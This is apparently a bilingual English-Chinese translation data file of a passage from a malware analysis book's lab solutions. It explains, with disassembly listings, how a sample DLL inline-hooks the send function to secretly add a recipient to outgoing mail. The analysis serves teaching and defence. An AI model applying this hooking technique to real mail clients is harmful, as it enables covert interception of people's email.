  zh: send
- en: call send
  id: totrans-3185
  prefs: []
  type: TYPE_NORMAL
  zh: call send
- en: jmp
  id: totrans-3186
  prefs: []
  type: TYPE_NORMAL
  zh: jmp
- en: malicious
  id: totrans-3187
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意
- en: function
  id: totrans-3188
  prefs: []
  type: TYPE_NORMAL
  zh: function
- en: code
  id: totrans-3189
  prefs: []
  type: TYPE_NORMAL
  zh: code
- en: code
  id: totrans-3190
  prefs: []
  type: TYPE_NORMAL
  zh: code
- en: body of
  id: totrans-3191
  prefs: []
  type: TYPE_NORMAL
  zh: body of
- en: send
  id: totrans-3192
  prefs: []
  type: TYPE_NORMAL
  zh: send
- en: function
  id: totrans-3193
  prefs: []
  type: TYPE_NORMAL
  zh: function
- en: code
  id: totrans-3194
  prefs: []
  type: TYPE_NORMAL
  zh: code
- en: start of
  id: totrans-3195
  prefs: []
  type: TYPE_NORMAL
  zh: start of
- en: send
  id: totrans-3196
  prefs: []
  type: TYPE_NORMAL
  zh: send
- en: function
  id: totrans-3197
  prefs: []
  type: TYPE_NORMAL
  zh: function
- en: code
  id: totrans-3198
  prefs: []
  type: TYPE_NORMAL
  zh: code
- en: jmp
  id: totrans-3199
  prefs: []
  type: TYPE_NORMAL
  zh: jmp
- en: '*Figure 11-4L: The send function before and after a hook is installed* The
    left side of Figure 11-4L shows what a normal call to the send function in *ws2_32.dll*
    looks like. The right side of the figure shows how hook_installer installs an
    inline hook of the send function. The start of the send function is replaced with
    a jump to malicious code, which calls a trampoline (shown in the figure’s lower-right
    box). The trampoline simply executes the start of the send function (which was
    overwritten with the first jump) and then jumps back to the original send function,
    so that the send function can operate as it did before the hook was installed.'
  id: totrans-3200
  prefs: []
  type: TYPE_NORMAL
  zh: '*图11-4L：安装钩子前后的send函数* 图11-4L的左侧显示了在*ws2_32.dll*中正常调用send函数的样子。图的右侧显示了hook_installer如何安装send函数的内联钩子。send函数的开始被替换为跳转到恶意代码，该代码调用一个跳板（如图中右下角所示）。跳板简单地执行send函数的开始（被第一次跳转覆盖），然后跳回原始的send函数，这样send函数就可以像安装钩子之前一样操作。'
- en: '**574**'
  id: totrans-3201
  prefs: []
  type: TYPE_NORMAL
  zh: '**574**'
- en: Appendix C
  id: totrans-3202
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3203
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Before hook_installer installs the hook, it checks to see which process the
    malware is running in. To do so, it calls three functions to get the current process
    name. Listing 11-9L contains code from the first of these functions, sub_10001075\.
  id: totrans-3204
  prefs: []
  type: TYPE_NORMAL
  zh: 在hook_installer安装钩子之前，它会检查恶意软件正在哪个进程中运行。为此，它调用三个函数来获取当前进程名称。列表11-9L包含这些函数中的第一个函数，即sub_10001075的代码。
- en: 1000107D push offset Filename ; lpFilename 10001082 mov eax, [ebp+hModule]
  id: totrans-3205
  prefs: []
  type: TYPE_NORMAL
  zh: 1000107D push offset Filename ; lpFilename 10001082 mov eax, [ebp+hModule]
- en: 10001085 push eax ; hModule 10001086 call ds:GetModuleFileNameA 
  id: totrans-3206
  prefs: []
  type: TYPE_NORMAL
  zh: 10001085 push eax ; hModule 10001086 call ds:GetModuleFileNameA 
- en: 1000108C mov ecx, [ebp+arg_4]
  id: totrans-3207
  prefs: []
  type: TYPE_NORMAL
  zh: 1000108C mov ecx, [ebp+arg_4]
- en: '1000108F mov dword ptr [ecx], offset Filename *Listing 11-9L: Calling GetModuleFileNameA
    to get the current process name* As you can see, GetModuleFileNameA is called
    at , and it returns the full path to the process in which the DLL is loaded because
    the argument hModule is set to 0 before the call to this function. Next, the malware
    returns the name in arg_4 (the string pointer passed to the function). This string
    is passed to two more functions, which parse the filename and change all of its
    characters to uppercase.'
  id: totrans-3208
  prefs: []
  type: TYPE_NORMAL
  zh: 1000108F mov dword ptr [ecx], offset Filename *列表11-9L：调用GetModuleFileNameA获取当前进程名称*
    如您所见，GetModuleFileNameA在处被调用，并且因为它在调用此函数之前将hModule参数设置为0，所以它返回了DLL加载到的进程的完整路径。接下来，恶意软件返回arg_4（传递给函数的字符串指针）中的名称。这个字符串被传递给另外两个函数，这些函数解析文件名并将所有字符都转换为大写。
- en: '**1 1**'
  id: totrans-3209
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 1**'
- en: '**NOTE**'
  id: totrans-3210
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*Malware that uses AppInit_DLLs as a persistence mechanism commonly uses* *GetModuleFileNameA.
    This malicious DLL is loaded into just about every process* *that starts on the
    system. Because malware authors may want to target only certain* *processes, they
    must determine the name of the process in which their malicious code is* *running.*'
  id: totrans-3211
  prefs: []
  type: TYPE_NORMAL
  zh: '*使用AppInit_DLLs作为持久机制的恶意软件通常使用* *GetModuleFileNameA。这个恶意DLL被加载到系统上几乎每个启动的进程中。因为恶意软件作者可能只想针对某些*
    *进程，他们必须确定恶意代码正在运行的进程名称。*'
- en: Next, the current process name in uppercase letters is compared to the process
    names THEBAT.EXE, OUTLOOK.EXE, and MSIMN.EXE. If the string does not equal one
    of these filenames, the malware will exit. However, if the malware has been loaded
    into one of these three processes, the malicious code seen in Listing 11-10L will
    execute.
  id: totrans-3212
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，将当前进程名称的大写字母与THEBAT.EXE、OUTLOOK.EXE和MSIMN.EXE这些进程名称进行比较。如果字符串不等于这些文件名之一，恶意软件将退出。然而，如果恶意软件被加载到这三个进程之一中，列表11-10L中看到的恶意代码将执行。
- en: 10001561 call sub_100013BD 
  id: totrans-3213
  prefs: []
  type: TYPE_NORMAL
  zh: 10001561 call sub_100013BD 
- en: 10001566 push offset dword_10003484 ; int
  id: totrans-3214
  prefs: []
  type: TYPE_NORMAL
  zh: 10001566 push offset dword_10003484 ; int
- en: 1000156B push offset sub_1000113D
  id: totrans-3215
  prefs: []
  type: TYPE_NORMAL
  zh: 1000156B push offset sub_1000113D
- en: ; int
  id: totrans-3216
  prefs: []
  type: TYPE_NORMAL
  zh: ; int
- en: 10001570 push offset aSend ; "send"
  id: totrans-3217
  prefs: []
  type: TYPE_NORMAL
  zh: 10001570 push offset aSend ; "send"
- en: 10001575 push offset aWsock32_dll ; "wsock32.dll"
  id: totrans-3218
  prefs: []
  type: TYPE_NORMAL
  zh: 10001575 push offset aWsock32_dll ; "wsock32.dll"
- en: 1000157A call sub_100012A3 
  id: totrans-3219
  prefs: []
  type: TYPE_NORMAL
  zh: 1000157A call sub_100012A3 
- en: 1000157F add esp, 10h
  id: totrans-3220
  prefs: []
  type: TYPE_NORMAL
  zh: 1000157F add esp, 10h
- en: 10001582 call sub_10001499 
  id: totrans-3221
  prefs: []
  type: TYPE_NORMAL
  zh: 10001582 call sub_10001499 
- en: '*Listing 11-10L: Malicious code that sets an inline hook* Listing 11-10L has
    several functions for us to analyze. Inside , we see calls to GetCurrentProcessId
    and then sub_100012FE, which we rename to suspend_threads. The suspend_threads
    function calls GetCurrentThreadId, which returns a thread identifier (TID) of
    the current thread of execution. Next, suspend_threads calls CreateToolhelp32Snapshot
    and uses the result to loop Solutions to Labs'
  id: totrans-3222
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表11-10L：设置内联钩子的恶意代码* 列表11-10L有几个函数供我们分析。在处，我们看到对GetCurrentProcessId的调用，然后是sub_100012FE，我们将其重命名为suspend_threads。suspend_threads函数调用GetCurrentThreadId，它返回当前执行线程的线程标识符（TID）。接下来，suspend_threads调用CreateToolhelp32Snapshot并使用结果进行循环。'
- en: '**575**'
  id: totrans-3223
  prefs: []
  type: TYPE_NORMAL
  zh: '**575**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3224
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: through all of the TIDs for the current process. If a TID is not the current
    thread, then SuspendThread is called using the TID. We can conclude that the function
    called at  suspends all executing threads in the current process.
  id: totrans-3225
  prefs: []
  type: TYPE_NORMAL
  zh: 遍历当前进程的所有TID。如果一个TID不是当前线程，则使用TID调用SuspendThread。我们可以得出结论，处调用的函数挂起了当前进程中的所有正在执行的线程。
- en: 'Conversely, the function called at  does the exact opposite: It resumes all
    of the threads using calls to ResumeThread. We conclude that the code in Listing
    11-10L is surrounded by two functions that suspend and then resume execution.
    This behavior is common when malware is making a change that could impact current
    execution, such as changing memory or installing an inline hook.'
  id: totrans-3226
  prefs: []
  type: TYPE_NORMAL
  zh: 相反，处调用的函数执行完全相反的操作：它使用ResumeThread调用恢复所有线程。我们得出结论，列表11-10L中的代码被两个挂起然后恢复执行的功能所包围。当恶意软件进行可能影响当前执行（如更改内存或安装内联钩子）的更改时，这种行为很常见。
- en: Next, we examine the code in the call at . The function sub_100012A3
  id: totrans-3227
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们检查处的调用中的代码。函数sub_100012A3
- en: takes four arguments, as shown by the series of pushes in Listing 11-10L.
  id: totrans-3228
  prefs: []
  type: TYPE_NORMAL
  zh: 它接受四个参数，如列表11-10L中的连续推入所示。
- en: Since this function is called only from this location, we can rename all of
    the arguments to match what is passed to the function, as shown in Listing 11-11L
  id: totrans-3229
  prefs: []
  type: TYPE_NORMAL
  zh: 由于这个函数只从这个位置调用，我们可以将所有参数重命名为与传递给函数的内容相匹配，如列表11-11L所示。
- en: beginning at .
  id: totrans-3230
  prefs: []
  type: TYPE_NORMAL
  zh: 从开始。
- en: 100012A3 sub_100012A3 proc near
  id: totrans-3231
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A3 sub_100012A3 proc near
- en: 100012A3
  id: totrans-3232
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A3
- en: 100012A3 lpAddress= dword ptr -8
  id: totrans-3233
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A3 lpAddress= dword ptr -8
- en: 100012A3 hModule = dword ptr -4
  id: totrans-3234
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A3 hModule = dword ptr -4
- en: 100012A3 wsock32_DLL= dword ptr 8 
  id: totrans-3235
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A3 wsock32_DLL= dword ptr 8 
- en: 100012A3 send_function= dword ptr 0Ch
  id: totrans-3236
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A3 send_function= dword ptr 0Ch
- en: 100012A3 p_sub_1000113D= dword ptr 10h
  id: totrans-3237
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A3 p_sub_1000113D= dword ptr 10h
- en: 100012A3 p_dword_10003484= dword ptr 14h
  id: totrans-3238
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A3 p_dword_10003484= dword ptr 14h
- en: 100012A3
  id: totrans-3239
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A3
- en: 100012A3 push ebp
  id: totrans-3240
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A3 push ebp
- en: 100012A4 mov ebp, esp
  id: totrans-3241
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A4 mov ebp, esp
- en: 100012A6 sub esp, 8
  id: totrans-3242
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A6 sub esp, 8
- en: 100012A9 mov eax, [ebp+wsock32_DLL]
  id: totrans-3243
  prefs: []
  type: TYPE_NORMAL
  zh: 100012A9 mov eax, [ebp+wsock32_DLL]
- en: 100012AC push eax ; lpModuleName 100012AD call ds:GetModuleHandleA 
  id: totrans-3244
  prefs: []
  type: TYPE_NORMAL
  zh: 100012AC push eax ; lpModuleName 100012AD call ds:GetModuleHandleA 
- en: '...'
  id: totrans-3245
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 100012CF mov edx, [ebp+send_function]
  id: totrans-3246
  prefs: []
  type: TYPE_NORMAL
  zh: 100012CF mov edx, [ebp+send_function]
- en: 100012D2 push edx ; lpProcName 100012D3 mov eax, [ebp+hModule]
  id: totrans-3247
  prefs: []
  type: TYPE_NORMAL
  zh: 100012D2 push edx ; lpProcName 100012D3 mov eax, [ebp+hModule]
- en: 100012D6 push eax ; hModule 100012D7 call ds:GetProcAddress 
  id: totrans-3248
  prefs: []
  type: TYPE_NORMAL
  zh: 100012D6 push eax ; hModule 100012D7 call ds:GetProcAddress 
- en: 100012DD mov [ebp+lpAddress], eax
  id: totrans-3249
  prefs: []
  type: TYPE_NORMAL
  zh: 100012DD mov [ebp+lpAddress], eax
- en: '*Listing 11-11L: sub_100012A3 resolving the send function* In Listing 11-11L,
    we see a handle to *wsock32.dll* obtained using GetModuleHandleA at . That handle
    is passed to GetProcAddress to resolve the send function at . The malware ends
    up passing the address of the send function and the two other parameters (sub_1000113D
    and dword_10003484) to sub_10001203, which we renamed place_hook.'
  id: totrans-3250
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表11-11L：sub_100012A3解析发送函数* 在列表11-11L中，我们看到使用GetModuleHandleA在处获得的*wsock32.dll*句柄。该句柄传递给GetProcAddress以解析处的发送函数。恶意软件最终将发送函数的地址和另外两个参数（sub_1000113D和dword_10003484）传递给重命名为place_hook的sub_10001203。'
- en: Now, we examine place_hook and rename the arguments accordingly in order to
    aid our analysis. Listing 11-12L shows the start of place_hook.
  id: totrans-3251
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们检查place_hook并相应地重命名参数，以帮助我们的分析。列表11-12L显示了place_hook的开始。
- en: '**576**'
  id: totrans-3252
  prefs: []
  type: TYPE_NORMAL
  zh: '**576**'
- en: Appendix C
  id: totrans-3253
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3254
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 10001209 mov eax, [ebp+_sub_1000113D]
  id: totrans-3255
  prefs: []
  type: TYPE_NORMAL
  zh: 10001209 mov eax, [ebp+_sub_1000113D]
- en: 1000120C sub eax, [ebp+send_address]
  id: totrans-3256
  prefs: []
  type: TYPE_NORMAL
  zh: 1000120C sub eax, [ebp+send_address]
- en: 1000120F sub eax, 5
  id: totrans-3257
  prefs: []
  type: TYPE_NORMAL
  zh: 1000120F sub eax, 5
- en: 10001212 mov [ebp+var_4], eax 
  id: totrans-3258
  prefs: []
  type: TYPE_NORMAL
  zh: 10001212 mov [ebp+var_4], eax 
- en: '*Listing 11-12L: Address calculation for the jump instruction* The code in
    Listing 11-12L calculates the difference between the memory address of the send
    function and the start of sub_1000113D. This difference has an additional 5 bytes
    subtracted from it before being moved into var_4'
  id: totrans-3259
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-12L：跳转指令的地址计算* 列表 11-12L 中的代码计算了发送函数内存地址与 sub_1000113D 开始之间的差异。这个差异在移动到
    var_4 之前减去了额外的 5 个字节。'
- en: at . var_4 is used later in the code and prepended with 0xE9 (the opcode for
    jmp), making this a 5-byte instruction to jump to sub_1000113D.
  id: totrans-3260
  prefs: []
  type: TYPE_NORMAL
  zh: 在 。var_4 在代码中稍后使用，并在前面加上 0xE9（jmp 操作码），这使得这是一个跳转到 sub_1000113D 的 5 字节指令。
- en: Let’s see how the malware installs this code as a hook later in place_hook.
  id: totrans-3261
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们稍后看看恶意软件如何在 place_hook 中安装此代码作为钩子。
- en: The start of the send function is modified by the instructions shown in Listing
    11-13L.
  id: totrans-3262
  prefs: []
  type: TYPE_NORMAL
  zh: 发送函数的开始被列表 11-13L 中显示的指令修改。
- en: 10001271 mov edx, [ebp+send_address]
  id: totrans-3263
  prefs: []
  type: TYPE_NORMAL
  zh: 10001271 mov edx, [ebp+send_address]
- en: 10001274 mov byte ptr [edx], 0E9h 
  id: totrans-3264
  prefs: []
  type: TYPE_NORMAL
  zh: 10001274 mov byte ptr [edx], 0E9h 
- en: 10001277 mov eax, [ebp+send_address]
  id: totrans-3265
  prefs: []
  type: TYPE_NORMAL
  zh: 10001277 mov eax, [ebp+send_address]
- en: 1000127A mov ecx, [ebp+var_4]
  id: totrans-3266
  prefs: []
  type: TYPE_NORMAL
  zh: 1000127A mov ecx, [ebp+var_4]
- en: 1000127D mov [eax+1], ecx 
  id: totrans-3267
  prefs: []
  type: TYPE_NORMAL
  zh: 1000127D mov [eax+1], ecx 
- en: '**1 1**'
  id: totrans-3268
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 1**'
- en: '*Listing 11-13L: The inline hook installation*'
  id: totrans-3269
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-13L：内联钩子安装*'
- en: At , the code copies the 0xE9 opcode into the start of the send function.
  id: totrans-3270
  prefs: []
  type: TYPE_NORMAL
  zh: At ，代码将 0xE9 操作码复制到发送函数的开始处。
- en: Following that, it copies var_4 into memory just after the 0xE9 at . Recall
    from Listing 11-12L that var_4 contains the destination of the jump, sub_1000113D.
  id: totrans-3271
  prefs: []
  type: TYPE_NORMAL
  zh: 随后，它将 var_4 复制到 0xE9  之后。回想一下列表 11-12L，var_4 包含跳转的目的地，sub_1000113D。
- en: The code in Listing 11-13L places a jmp instruction at the beginning of the
    send function that jumps to the function in our DLL at sub_1000113D, which we’ll
    now rename hook_function.
  id: totrans-3272
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-13L 中的代码在发送函数的开始处放置一个 jmp 指令，该指令跳转到我们 DLL 中的函数 sub_1000113D，我们将它重命名为 hook_function。
- en: Before we examine hook_function, let’s wrap up our analysis of the inline hook
    installation. Listing 11-14L shows place_hook manipulating memory.
  id: totrans-3273
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们检查 hook_function 之前，让我们完成对内联钩子安装的分析。列表 11-14L 显示了 place_hook 操作内存。
- en: 10001218 push ecx ; lpflOldProtect 10001219 push PAGE_EXECUTE_READWRITE ; flNewProtect
    1000121B push 5 ; dwSize 1000121D mov edx, [ebp+send_address]
  id: totrans-3274
  prefs: []
  type: TYPE_NORMAL
  zh: 10001218 push ecx ; lpflOldProtect 10001219 push PAGE_EXECUTE_READWRITE ; flNewProtect
    1000121B push 5 ; dwSize 1000121D mov edx, [ebp+send_address]
- en: 10001220 push edx ; lpAddress 10001221 call ds:VirtualProtect 
  id: totrans-3275
  prefs: []
  type: TYPE_NORMAL
  zh: 10001220 push edx ; lpAddress 10001221 call ds:VirtualProtect 
- en: 10001227 push 0FFh ; Size
  id: totrans-3276
  prefs: []
  type: TYPE_NORMAL
  zh: 10001227 push 0FFh ; 大小
- en: 1000122C call malloc
  id: totrans-3277
  prefs: []
  type: TYPE_NORMAL
  zh: 1000122C call malloc
- en: 10001231 add esp, 4
  id: totrans-3278
  prefs: []
  type: TYPE_NORMAL
  zh: 10001231 add esp, 4
- en: 10001234 mov [ebp+var_8], eax 
  id: totrans-3279
  prefs: []
  type: TYPE_NORMAL
  zh: 10001234 mov [ebp+var_8], eax 
- en: '*Listing 11-14L: place_hook (sub_10001203) manipulating memory* In Listing
    11-14L, place_hook calls VirtualProtect at  on the start of the send function
    code. This action changes the memory protection to execute, read, and write access,
    thereby allowing the malware to modify the instructions of the send function.
    Another call to VirtualProtect at the end of the Solutions to Labs'
  id: totrans-3280
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-14L：place_hook (sub_10001203) 操作内存* 在列表 11-14L 中，place_hook 在发送函数代码的开始处调用
    VirtualProtect 。这个操作将内存保护更改为可执行、可读和可写访问，从而允许恶意软件修改发送函数的指令。在解决方案的末尾还有另一个对 VirtualProtect
    的调用。'
- en: '**577**'
  id: totrans-3281
  prefs: []
  type: TYPE_NORMAL
  zh: '**577**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3282
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: function restores the original memory-protection settings. Then, immediately
    after calling VirtualProtect, the malware allocates 0xFF bytes of memory using
    malloc and stores the result in var_8 at . Because this dynamically allocated
    memory will play an important role in the installation of our hook as a trampoline,
    we’ll rename var_8 to trampoline.
  id: totrans-3283
  prefs: []
  type: TYPE_NORMAL
  zh: 函数恢复原始的内存保护设置。然后，在调用 VirtualProtect 后，恶意软件使用 malloc 分配了 0xFF 字节的内存，并将结果存储在 var_8
     中。由于此动态分配的内存将在我们的钩子作为跳板安装中发挥重要作用，我们将 var_8 重命名为 trampoline。
- en: '**NOTE**'
  id: totrans-3284
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*In order for this to execute properly, the memory returned by the call to
    malloc must be* *executable memory, which might not always be the case if, for
    example, Data Execution* *Prevention (DEP) is enabled via /Noexecute=alwayson
    or similar.*'
  id: totrans-3285
  prefs: []
  type: TYPE_NORMAL
  zh: '*为了正确执行，malloc 调用返回的内存必须是可执行内存，这可能不是总是情况，例如，如果通过 /Noexecute=alwayson 或类似方式启用了数据执行保护
    (DEP)。*'
- en: Listing 11-15L shows the creation of the trampoline’s code.
  id: totrans-3286
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-15L 展示了跳转代码的创建。
- en: 10001246 push 5 ; Size
  id: totrans-3287
  prefs: []
  type: TYPE_NORMAL
  zh: 10001246 push 5 ; 大小
- en: 10001248 mov eax, [ebp+send_address]
  id: totrans-3288
  prefs: []
  type: TYPE_NORMAL
  zh: 10001248 mov eax, [ebp+send_address]
- en: 1000124B push eax ; Src
  id: totrans-3289
  prefs: []
  type: TYPE_NORMAL
  zh: 1000124B push eax ; Src
- en: 1000124C mov ecx, [ebp+trampoline]
  id: totrans-3290
  prefs: []
  type: TYPE_NORMAL
  zh: 1000124C mov ecx, [ebp+trampoline]
- en: 1000124F add ecx, 5
  id: totrans-3291
  prefs: []
  type: TYPE_NORMAL
  zh: 1000124F add ecx, 5
- en: 10001252 push ecx ; Dst
  id: totrans-3292
  prefs: []
  type: TYPE_NORMAL
  zh: 10001252 push ecx ; Dst
- en: 10001253 call memcpy 
  id: totrans-3293
  prefs: []
  type: TYPE_NORMAL
  zh: 10001253 call memcpy 
- en: 10001258 add esp, 0Ch
  id: totrans-3294
  prefs: []
  type: TYPE_NORMAL
  zh: 10001258 add esp, 0Ch
- en: 1000125B mov edx, [ebp+trampoline]
  id: totrans-3295
  prefs: []
  type: TYPE_NORMAL
  zh: 1000125B mov edx, [ebp+trampoline]
- en: 1000125E mov byte ptr [edx+0Ah], 0E9h 
  id: totrans-3296
  prefs: []
  type: TYPE_NORMAL
  zh: 1000125E mov byte ptr [edx+0Ah], 0E9h 
- en: 10001262 mov eax, [ebp+send_address]
  id: totrans-3297
  prefs: []
  type: TYPE_NORMAL
  zh: 10001262 mov eax, [ebp+send_address]
- en: 10001265 sub eax, [ebp+trampoline]
  id: totrans-3298
  prefs: []
  type: TYPE_NORMAL
  zh: 10001265 sub eax, [ebp+trampoline]
- en: 10001268 sub eax, 0Ah
  id: totrans-3299
  prefs: []
  type: TYPE_NORMAL
  zh: 10001268 sub eax, 0Ah
- en: 1000126B mov ecx, [ebp+trampoline]
  id: totrans-3300
  prefs: []
  type: TYPE_NORMAL
  zh: 1000126B mov ecx, [ebp+trampoline]
- en: 1000126E mov [ecx+0Bh], eax 
  id: totrans-3301
  prefs: []
  type: TYPE_NORMAL
  zh: 1000126E mov [ecx+0Bh], eax 
- en: '*Listing 11-15L: Trampoline creation for the inline hook* In Listing 11-15L,
    the memcpy at  copies the first 5 bytes of the send function into the trampoline.
    Since the malware overwrites the first 5 bytes of the send instruction (Listing
    11-13L), it needs to make sure that the original instructions are saved. The malware
    assumes that the send function’s first several instructions align exactly on 5
    bytes, which might not always be the case.'
  id: totrans-3302
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表11-15L：为内联钩子创建trampoline* 在列表11-15L中，memcpy在处复制了send函数的前5个字节到trampoline中。由于恶意软件覆盖了send指令的前5个字节（列表11-13L），它需要确保原始指令被保存。恶意软件假设send函数的前几个指令正好对齐在5个字节上，这并不总是可能的情况。'
- en: Next, the malware adds a jmp instruction to the trampoline code at 
  id: totrans-3303
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，恶意软件在处的trampoline代码中添加一个jmp指令
- en: and . At , the 0xE9 opcode is added. At , the location to jump is added.
  id: totrans-3304
  prefs: []
  type: TYPE_NORMAL
  zh: and . 在处，添加了0xE9操作码。在处，添加了跳转位置。
- en: The jump location is calculated by subtracting the location of the trampoline
    from the location of the send function (meaning it will jump back to the send
    function).
  id: totrans-3305
  prefs: []
  type: TYPE_NORMAL
  zh: 跳转位置是通过从send函数的位置减去trampoline的位置来计算的（这意味着它将跳回到send函数）。
- en: Finally, place_hook ends by setting the global variable dword_10003484 to the
    trampoline location. We rename dword_10003484 to trampoline_function to aid analysis.
  id: totrans-3306
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，place_hook通过将全局变量dword_10003484设置为trampoline位置来结束。我们将dword_10003484重命名为trampoline_function以帮助分析。
- en: 'Next, we analyze hook_function (sub_1000113D), which will have the same arguments
    as the send function since it is installed as a hook. We begin our analysis by
    right-clicking the function name, selecting **Set Function Type**, and entering
    the following:'
  id: totrans-3307
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们分析hook_function（sub_1000113D），它将具有与send函数相同的参数，因为它被安装为钩子。我们通过右键单击函数名，选择**设置函数类型**，并输入以下内容开始分析：
- en: '**int __stdcall hook_function(SOCKET s, char * buf, int len, int flags)** **578**'
  id: totrans-3308
  prefs: []
  type: TYPE_NORMAL
  zh: '**int __stdcall hook_function(SOCKET s, char * buf, int len, int flags)** **578**'
- en: Appendix C
  id: totrans-3309
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3310
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'The hook function looks for the string RCPT TO: in buf. If the string isn’t
    found, the malware just calls trampoline_function, which causes send to operate
    as it did before the hook was installed. Otherwise, the code in Listing 11-16L'
  id: totrans-3311
  prefs: []
  type: TYPE_NORMAL
  zh: 钩子函数在buf中查找字符串RCPT TO:。如果没有找到该字符串，恶意软件将调用trampoline_function，这将导致send在安装钩子之前以相同的方式操作。否则，列表11-16L中的代码
- en: will execute.
  id: totrans-3312
  prefs: []
  type: TYPE_NORMAL
  zh: 将执行。
- en: '1000116D push offset aRcptTo_1 ; "RCPT TO: <" '
  id: totrans-3313
  prefs: []
  type: TYPE_NORMAL
  zh: '1000116D push offset aRcptTo_1 ; "RCPT TO: <" '
- en: 10001172 lea ecx, [ebp+Dst]
  id: totrans-3314
  prefs: []
  type: TYPE_NORMAL
  zh: 10001172 lea ecx, [ebp+Dst]
- en: 10001178 push ecx ; Dst
  id: totrans-3315
  prefs: []
  type: TYPE_NORMAL
  zh: 10001178 push ecx ; Dst
- en: 10001179 call memcpy
  id: totrans-3316
  prefs: []
  type: TYPE_NORMAL
  zh: 10001179 call memcpy
- en: '...'
  id: totrans-3317
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 10001186 push offset email_address ; Src 
  id: totrans-3318
  prefs: []
  type: TYPE_NORMAL
  zh: 10001186 push offset email_address ; Src 
- en: '...'
  id: totrans-3319
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 10001198 lea edx, [ebp+eax+Dst]
  id: totrans-3320
  prefs: []
  type: TYPE_NORMAL
  zh: 10001198 lea edx, [ebp+eax+Dst]
- en: 1000119F push edx ; Dst
  id: totrans-3321
  prefs: []
  type: TYPE_NORMAL
  zh: 1000119F push edx ; Dst
- en: 100011A0 call memcpy
  id: totrans-3322
  prefs: []
  type: TYPE_NORMAL
  zh: 100011A0 call memcpy
- en: 100011A8 push offset Source ; ">\r\n" 
  id: totrans-3323
  prefs: []
  type: TYPE_NORMAL
  zh: 100011A8 push offset Source ; ">\r\n" 
- en: 100011AD lea eax, [ebp+Dst]
  id: totrans-3324
  prefs: []
  type: TYPE_NORMAL
  zh: 100011AD lea eax, [ebp+Dst]
- en: 100011B3 push eax ; Dest
  id: totrans-3325
  prefs: []
  type: TYPE_NORMAL
  zh: 100011B3 push eax ; Dest
- en: 100011B4 call strcat
  id: totrans-3326
  prefs: []
  type: TYPE_NORMAL
  zh: 100011B4 call strcat
- en: '*Listing 11-16L: Creating the string to add a recipient* **1 1**'
  id: totrans-3327
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表11-16L：创建添加收件人的字符串* **1 1**'
- en: 'The code in Listing 11-16L builds a string that is added to the outgoing buffer.
    This string starts with RCPT TO: < at , followed by email_address at , and ends
    with >\r\n at . The email_address value in this case is *billy@*'
  id: totrans-3328
  prefs: []
  type: TYPE_NORMAL
  zh: '列表11-16L中的代码构建了一个字符串，并将其添加到输出缓冲区。这个字符串以RCPT TO: <开始，后面跟着email_address，并以>\r\n结束。在这种情况下，email_address的值是*billy@*'
- en: '*malwareanalysisbook.com* (extracted from *Lab11-02.ini*, as explained earlier
    when we looked at the contents of that file). This code adds a recipient to all
    outgoing email messages.'
  id: totrans-3329
  prefs: []
  type: TYPE_NORMAL
  zh: '*malwareanalysisbook.com*（从*Lab11-02.ini*中提取，如前所述，当我们查看该文件的内容时所述）。此代码将收件人添加到所有发出的电子邮件消息中。'
- en: '**Low-Level Hook Operation Summary**'
  id: totrans-3330
  prefs: []
  type: TYPE_NORMAL
  zh: '**低级钩子操作摘要**'
- en: 'Here’s a summary of the hook’s operation (also illustrated at a high-level
    in Figure 11-4L, shown earlier):'
  id: totrans-3331
  prefs: []
  type: TYPE_NORMAL
